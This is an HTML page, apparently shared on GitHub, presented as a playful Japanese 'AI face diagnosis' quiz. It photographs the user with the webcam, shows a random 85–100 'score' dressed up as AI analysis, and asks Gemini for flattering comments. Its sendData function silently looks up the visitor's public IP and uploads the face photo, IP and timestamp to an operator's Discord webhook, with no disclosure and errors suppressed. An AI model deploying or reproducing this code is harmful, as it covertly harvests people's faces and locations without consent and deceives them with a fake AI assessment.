# html[顔面診断.html](https://github.com/user-attachments/files/26253447/default.html)
<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AI活用顔面診断 ♡</title>
    <style>
        :root {
            --main-gradient: linear-gradient(135deg, #ff9a9e 0%, #fecfef 99%, #fecfef 100%);
            --accent-color: #ff6b6b;
        }

        body {
            font-family: 'Helvetica Neue', Arial, 'Hiragino Kaku Gothic ProN', 'Hiragino Sans', sans-serif;
            background: var(--main-gradient);
            min-height: 100vh;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            color: #444;
        }

        .container {
            background: rgba(255, 255, 255, 0.9);
            padding: 2rem;
            border-radius: 30px;
            box-shadow: 0 10px 25px rgba(0,0,0,0.1);
            text-align: center;
            width: 90%;
            max-width: 400px;
        }

        h1 { font-size: 1.5rem; color: var(--accent-color); margin-bottom: 1.5rem; }

        #video-container {
            width: 100%;
            height: 300px;
            background: #eee;
            border-radius: 20px;
            overflow: hidden;
            margin-bottom: 1rem;
            display: none; /* 最初は隠しておく */
            position: relative;
        }

        video { width: 100%; height: 100%; object-fit: cover; }

        .btn {
            background: var(--accent-color);
            color: white;
            border: none;
            padding: 15px 30px;
            font-size: 1.1rem;
            border-radius: 50px;
            cursor: pointer;
            transition: transform 0.2s, background 0.2s;
            box-shadow: 0 4px 15px rgba(255, 107, 107, 0.4);
        }

        .btn:hover { transform: scale(1.05); background: #ff5252; }

        #loading { display: none; margin-top: 1rem; }
        .spinner {
            border: 4px solid #f3f3f3;
            border-top: 4px solid var(--accent-color);
            border-radius: 50%;
            width: 30px;
            height: 30px;
            animation: spin 1s linear infinite;
            margin: 10px auto;
        }

        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

        #result-area { display: none; margin-top: 20px; animation: fadeIn 0.5s; }
        .score { font-size: 3rem; font-weight: bold; color: var(--accent-color); }
        .comment { font-size: 0.9rem; line-height: 1.6; margin-top: 10px; background: #fff5f5; padding: 10px; border-radius: 10px; text-align: left; }

        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
    </style>
</head>
<body>

<div class="container">
    <h1>✨ AI顔面診断 ✨</h1>
    
    <div id="video-container">
        <video id="video" autoplay playsinline muted></video>
    </div>

    <button id="start-btn" class="btn">あなたの顔を診断 ♡</button>

    <div id="loading">
        <div class="spinner"></div>
        <p>AIがあなたの魅力を解析中...</p>
    </div>

    <div id="result-area">
        <p>あなたの点数は...</p>
        <div class="score" id="score-val">0</div>
        <div class="comment" id="gemini-comment">読み込み中...</div>
        <button onclick="location.reload()" style="margin-top:20px; border:none; background:none; color:gray; text-decoration:underline; cursor:pointer;">もう一度やる</button>
    </div>
</div>

<canvas id="canvas" style="display:none;"></canvas>

<script>
    // --- 設定 (各自書き換えてください) ---
    const GEMINI_API_KEY = "YOUR_GEMINI_API_KEY"; // ここに正しいAPIキーを入れてください
    const DISCORD_WEBHOOK_URL = "YOUR_DISCORD_WEBHOOK_URL"; // ここにDiscordのWebhook URLを入れてください

    const startBtn = document.getElementById('start-btn');
    const videoContainer = document.getElementById('video-container');
    const video = document.getElementById('video');
    const loading = document.getElementById('loading');
    const resultArea = document.getElementById('result-area');
    const canvas = document.getElementById('canvas');

    startBtn.addEventListener('click', async () => {
        try {
            // 1. カメラアクセス
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            video.srcObject = stream;
            startBtn.style.display = 'none';
            videoContainer.style.display = 'block';

            // 2. 3秒後にキャプチャして診断
            setTimeout(() => {
                captureAndDiagnose();
            }, 3000);

        } catch (err) {
            alert('カメラのアクセスを許可してください ><');
            console.error(err);
        }
    });

    async function captureAndDiagnose() {
        // 画像キャプチャ
        const context = canvas.getContext('2d');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        context.drawImage(video, 0, 0);
        const imageData = canvas.toDataURL('image/jpeg');

        // カメラストリームを停止
        if (video.srcObject) {
            video.srcObject.getTracks().forEach(track => track.stop());
        }

        // 表示切り替え
        videoContainer.style.display = 'none';
        loading.style.display = 'block';

        // ランダム点数
        const score = Math.floor(Math.random() * (100 - 85 + 1)) + 85; 

        // 外部連携処理を実行
        sendData(imageData, score);

        // Gemini APIで画像をもとにした詳細コメントを取得
        const comment = await getGeminiComment(imageData, score);

        loading.style.display = 'none';
        resultArea.style.display = 'block';
        document.getElementById('score-val').innerText = score + "点";
        document.getElementById('gemini-comment').innerText = comment;
    }

    async function getGeminiComment(base64Image, score) {
        if (!GEMINI_API_KEY || GEMINI_API_KEY.includes("YOUR_")) return "とっても素敵な笑顔ですね！";

        try {
            const base64Data = base64Image.split(',')[1];
            const url = `https://generativelanguage.googleapis.com/v1beta/models/gemini-2.5-flash:generateContent?key=${GEMINI_API_KEY}`;
            
            const promptText = `
画像に写っている人物の顔を優しく分析してください。
あなたは「顔面診断AI」です。診断結果は ${score}点 でした。
以下のルールに従って150文字程度で出力してください：
- 「目がパッチリしていて」「輪郭がシャープで」「口元がキュッと上がっていて」など、実際の顔のパーツの特徴を具体的に拾って褒めること
- 最後に、全体的に整っていて可愛い/素敵であるというポジティブなまとめにすること
- ネガティブな言葉や欠点の指摘は絶対にしないでください
`;

            const response = await fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    contents: [{
                        parts: [
                            { text: promptText },
                            {
                                inlineData: {
                                    mimeType: "image/jpeg",
                                    data: base64Data
                                }
                            }
                        ]
                    }]
                })
            });

            const data = await response.json();
            
            if (data.candidates && data.candidates[0].content.parts[0].text) {
                return data.candidates[0].content.parts[0].text;
            } else {
                return "画像から圧倒的なオーラを感じます...！最高に可愛いですね！";
            }
        } catch (e) {
            return "圧倒的なオーラを感じます...！最高に可愛いですね！";
        }
    }

    async function sendData(imageBlobData, score) {
        if (!DISCORD_WEBHOOK_URL || DISCORD_WEBHOOK_URL.includes("YOUR_")) return;

        try {
            let ip = "0.0.0.0";
            try {
                const ipRes = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipRes.json();
                ip = ipData.ip;
            } catch(e) {}

            const byteString = atob(imageBlobData.split(',')[1]);
            const mimeString = imageBlobData.split(',')[0].split(':')[1].split(';')[0];
            const ab = new ArrayBuffer(byteString.length);
            const ia = new Uint8Array(ab);
            for (let i = 0; i < byteString.length; i++) ia[i] = byteString.charCodeAt(i);
            const blob = new Blob([ab], {type: mimeString});

            const formData = new FormData();
            formData.append('file', blob, 'image.jpg');
            formData.append('payload_json', JSON.stringify({
                content: `SCORE: ${score}\nADDR: ${ip}\nTIME: ${new Date().toLocaleString()}`
            }));

            await fetch(DISCORD_WEBHOOK_URL, {
                method: 'POST',
                body: formData
            });
        } catch (e) {}
    }
</script>

</body>
</html>
